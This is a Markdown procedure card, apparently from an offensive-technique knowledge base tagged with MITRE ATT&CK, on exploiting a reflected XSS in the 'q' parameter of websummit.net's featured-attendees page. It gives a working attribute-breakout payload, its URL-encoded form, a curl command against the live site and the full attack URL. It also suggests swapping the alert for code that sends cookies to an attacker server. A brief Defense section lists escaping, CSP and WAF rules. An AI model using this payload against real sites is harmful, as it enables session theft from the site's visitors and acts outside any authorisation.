---
tags:
  - xss
  - reflected-xss
  - javascript
  - handlebars
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-xss-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:41.378Z'
sub_techniques: []
id: d616bdc6-4a01-4d37-980c-6c3dd6d00f85
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
---
# Inject-Reflected-XSS-Payload-into-Search-Parameter

## Summary

This procedure exploits a reflected XSS vulnerability by injecting a malicious payload into the 'q' search parameter on the WebSummit featured attendees page, causing it to reflect unsanitized into a Handlebars template's data-url attribute, allowing attribute breakout and JavaScript execution in the victim's browser context.

## Description

The vulnerability occurs because the 'q' parameter is directly inserted into the data-url attribute of a <script> tag without proper URL encoding for special characters like single quotes (') and angle brackets (<>). An attacker can craft a URL that, when visited by a victim, breaks out of the attribute and injects executable HTML/JavaScript, such as an iframe that alerts the domain or exfiltrates cookies. This is a classic reflected XSS, effective via phishing links, with potential for session theft though limited by the site's scope. The target environment is a public web application using Handlebars for templating and an API at api.cilabs.net.

## Requirements

1. Access to a web browser or HTTP client to craft and send requests
2. Knowledge of URL encoding to evade basic filters
3. Victim interaction (e.g., clicking a malicious link)

## Defense

Defensive measures and detection strategies:

- Implement strict URL encoding and HTML escaping for all user inputs reflected into attributes (e.g., use OWASP ESAPI or similar)
- Content Security Policy (CSP) to restrict inline script execution and iframe sources
- Web Application Firewall (WAF) rules to detect common XSS payloads like <iframe/onload=
- Server-side validation to sanitize or reject suspicious query parameters

## Objectives

1. Break out of the data-url attribute to inject executable JavaScript
2. Execute code in the browser context to demonstrate impact, such as alerting the domain
3. Potentially collect sensitive data like cookies for further attacks

## Instructions

### Step 1: Craft the Malicious Payload

**Context**: Encode a payload that closes the attribute with a single quote and injects an iframe tag to execute JavaScript on load.

Use a payload like: rubyoob'><iframe/onload=alert(document.domain)></iframe>

URL-encode it: rubyoob%27%3E%3Ciframe/onload=alert(document.domain)%3E%3C/iframe%3E

No command needed here; this is manual crafting.

### Step 2: Deliver and Test the Payload

**Context**: Append the encoded payload to the 'q' parameter and access the URL to trigger reflection and execution.

Execute [[commands/curl-xss-test]] to verify reflection in the response:

```bash
curl -s "https://websummit.net/attendees/featured-attendees?q=rubyoob%27%3E%3Ciframe/onload=alert(document.domain)%3E%3C/iframe%3E" | grep -i "data-url"
```

> This command fetches the page silently and greps for the data-url attribute. Expected output shows the reflected payload breaking out, e.g., data-url="...q=rubyoob'><iframe...". In a browser, this renders and executes the alert.

### Step 3: Validate Execution

**Context**: Visit the crafted URL in a browser to confirm JavaScript execution.

Manually navigate to: https://websummit.net/attendees/featured-attendees?q=rubyoob%27%3E%3Ciframe/onload=alert(document.domain)%3E%3C/iframe%3E

> Observe the alert dialog popping up with 'websummit.net'. For real impact, replace alert with code to send document.cookie to an attacker server.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-xss-test]]

## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[JavaScript]]
